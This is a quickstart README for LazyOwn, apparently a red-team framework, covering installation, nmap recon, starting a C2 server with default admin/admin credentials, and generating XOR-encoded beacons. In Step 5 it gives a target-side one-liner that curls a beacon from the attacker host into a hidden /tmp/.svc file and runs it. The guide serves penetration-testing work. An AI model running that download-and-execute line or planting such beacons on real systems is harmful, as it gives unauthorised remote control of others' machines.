# LazyOwn — 5-Minute Quickstart

Everything you need to go from a fresh clone to an active engagement in under five minutes.

## Prerequisites

- Kali Linux / Parrot OS (or any Debian-based distro)
- Python 3.10+
- `git`, `make`, `gcc`
- SecLists at `/usr/share/seclists` (or `/usr/share/wordlists/SecLists-master`)

```bash
sudo apt install -y seclists 2>/dev/null || true
```

---

## Step 1 — Clone and install

```bash
git clone https://github.com/grisuno/LazyOwn.git
cd LazyOwn
bash install.sh
```

`install.sh` creates the virtualenv at `env/`, installs all Python deps, and
generates `cert.pem` / `key.pem` for the C2.

---

## Step 2 — Run the guided setup wizard

```bash
./run
```

On first launch you will be prompted to run `wizard`. Accept.  
The wizard auto-detects your `lhost` from the routing table, walks you through
7 steps (target IP, attacker IP, domain, network device, OS type, Groq API key,
SecLists paths), and writes everything to `payload.json`.

```
(LazyOwn) > wizard
```

Or run the readiness check without changing anything:

```
(LazyOwn) > wizard --check
```

---

## Step 3 — Start recon

```bash
(LazyOwn) > ping           # confirm target is alive
(LazyOwn) > lazynmap       # full port scan → sessions/scan_<rhost>.nmap
(LazyOwn) > auto_populate  # parse scan output into world_model.json
(LazyOwn) > facts_show     # see what was discovered
```

---

## Step 4 — Start the C2

In a second terminal:

```bash
bash fast_run_as_r00t.sh --no-attach --vpn 1
```

Or start it inline from the shell:

```bash
(LazyOwn) > lazyc2
```

The C2 starts at `https://<lhost>:<c2_port>` with the credentials from
`payload.json` (`c2_user` / `c2_pass`, default `admin` / `admin`).

---

## Step 5 — Get your first shell

```bash
# Generate and deliver the Go beacon (two-stage, XOR-encoded)
(LazyOwn) > lazymsfvenom              # or use the beacon lazyaddon for a C implant

# Or drop the Linux C beacon with BOF support
(LazyOwn) > blacksandbeacon          # compile → sessions/blacksandbeacon
# Then run on target:
# curl -sk "http://<lhost>:<lport>/blacksandbeacon" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
```

Once a beacon checks in, manage it from the C2 dashboard at
`https://<lhost>:<c2_port>`.

---

## Step 6 (optional) — Invite teammates

```bash
(LazyOwn) > collab_join alice
```

Prints the team dashboard URL and SSE stream endpoint. Share the URL with
your team. Everyone connects to `https://<lhost>:<c2_port>/collab/?operator=<handle>`.

The collaboration layer provides:
- Real-time event broadcast via SSE (findings, commands, phase changes)
- Advisory target locks (prevents two operators running tools against the same host)
- Operator presence registry
- Chat broadcast

---

## Common first-session commands

| Goal | Command |
|---|---|
| Set target | `assign rhost 10.10.11.5` |
| Set attacker IP | `assign lhost 10.10.14.3` |
| Full wizard | `wizard` |
| Port scan | `lazynmap` |
| Web enum | `gobuster` |
| SMB enum | `enum4linux` |
| Check what to do next | `recommend_next` |
| Phase guide | `phase_guide recon` |
| AI next step | `auto_loop` |
| Team join URL | `collab_join <handle>` |
| Payload dashboard | `dashboard` |

---

## Key files

| File | Purpose |
|---|---|
| `payload.json` | Single source of truth — all config lives here |
| `sessions/scan_<ip>.nmap` | Nmap output — read before re-scanning |
| `sessions/world_model.json` | Current phase, discovered hosts, creds |
| `sessions/credentials*.txt` | Captured credentials |
| `sessions/LazyOwn_session_report.csv` | Full command history |

---

## Troubleshooting

**`wizard` can't detect lhost** — run `ip route` and set it manually:
```
(LazyOwn) > assign lhost 10.10.14.3
```

**C2 TLS errors** — regenerate certs:
```bash
bash gen_cert.sh
```

**Nmap taking too long** — check `sessions/scan_<rhost>.nmap` first; it may
already exist from a previous run. `facts_show` reads it without rescanning.

**Missing SecLists** — install with `sudo apt install seclists` or set
`dirwordlist` manually:
```
(LazyOwn) > assign dirwordlist /path/to/wordlist.txt
```
